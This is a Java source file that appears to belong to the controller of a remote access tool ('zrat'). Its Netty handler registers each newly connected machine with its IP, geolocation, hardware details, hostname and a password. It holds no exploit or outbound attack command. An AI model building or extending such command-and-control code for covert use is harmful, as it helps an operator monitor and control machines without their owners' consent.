package com.zrat.client.nio.handler;


import java.util.Map;

import org.jboss.netty.channel.ChannelHandlerContext;
import org.jboss.netty.channel.MessageEvent;
import org.jboss.netty.channel.ChannelHandler.Sharable;

import com.zrat.client.ui.Client;
import com.zrat.client.ui.model.ServerModel;
import com.zrat.client.util.IPSeeker;
import com.zrat.transfer.model.TransferDataStruct;

@Sharable
public class AcceptConnectionHandler extends ClientNIOHandler{

	private static final String COMMAND_NEW_SERVER = "newServer";
	private static final String PROPERTY_PROCESSOR = "processor";
	private static final String PROPERTY_SYSTEMNAME = "systemName";
	private static final String PROPERTY_MEMORY = "memory";
	private static final String PROPERTY_PASSWORD = "password";
	private static final String PROPERTY_HOSTNAME = "hostName";
	@Override
	public void processMessage(ChannelHandlerContext ctx, MessageEvent e) {
		if (e.getMessage() instanceof TransferDataStruct) {
			TransferDataStruct data = (TransferDataStruct) e.getMessage();
			if (COMMAND_NEW_SERVER.equals(data.getAction())) {
				ServerModel server = new ServerModel();
				Map<String,Object> map = (Map<String, Object>) data.getObject();
				IPSeeker seeker = IPSeeker.getInstance();
				server.setId(ctx.getChannel().getId()+"");
				server.setChannel(ctx.getChannel());
				String ip = ctx.getChannel().getRemoteAddress().toString().substring(1,ctx.getChannel().getRemoteAddress().toString().indexOf(":"));
				server.setIp(ip);
				String area = seeker.getArea(ip);
				server.setArea(area);
				String country = seeker.getCountry(ip);
				server.setCountry(country);
				
				server.setProcessors(Integer.parseInt(map.get(PROPERTY_PROCESSOR)+""));
				server.setSystemName(map.get(PROPERTY_SYSTEMNAME)+"");
				server.setMemory(Long.parseLong(map.get(PROPERTY_MEMORY)+""));
				server.setPassword(map.get(PROPERTY_PASSWORD)+"");
				server.setHostName(map.get(PROPERTY_HOSTNAME)+"");
				Client.addServer(server);
			}else{
				ctx.sendUpstream(e);
			}
		}else{
			ctx.sendUpstream(e);
		}
	}

}
